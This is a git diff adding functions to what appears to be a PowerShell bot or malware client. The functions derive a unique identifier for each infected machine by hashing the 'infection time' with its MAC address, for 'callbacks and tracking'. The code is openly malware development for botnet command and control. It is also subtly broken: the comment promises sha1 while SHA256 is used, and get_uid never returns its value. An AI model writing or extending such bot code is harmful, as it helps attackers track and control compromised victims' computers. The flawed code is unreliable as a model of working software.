@@ -10,6 +10,35 @@ function create_json($json_object, $input_object) {
 	return $json_object
 }
 
+# Name:			create_hash
+# Parameters:	$str_to_hash (the string we want to hash with sha1)
+# Return value:	$hashed (the hashed string)
+# Purpose:		create a hash of a string, used for bot uid
+function create_hash($str_to_hash){
+	$algorithm = new-object System.Security.Cryptography.SHA256Managed
+    $toHash = [System.Text.Encoding]::UTF8.GetBytes($str_to_hash)
+    $hashByteArray = $algorithm.ComputeHash($toHash)
+    foreach($byte in $hashByteArray)
+    {
+         $hashed += $byte.ToString()
+    }
+    return $hashed;
+}
+
+# Name:			get_uid
+# Parameters:	None
+# Return value:	$bot_uid (the uid of our bot)
+# Purpose:		gets the uid of our bot for callbacks and tracking
+function get_uid() {
+	# get infection time and then mac address to hash for bot uid
+	$date = @(get-date)
+	$adapter = @(get-netadapter | select MacAddress | select-object -first 1)
+	$mac = $adapter[0].MacAddress # we just want the 1st mac yolosauce
+	$to_hash = $date + $mac
+	# hash the date+mac
+	$bot_uid = create_hash $to_hash
+}
+
 # Name: 		find_string
 # Parameters: 	$string (value to search)
 # Return value:	returns an object containing the list of files
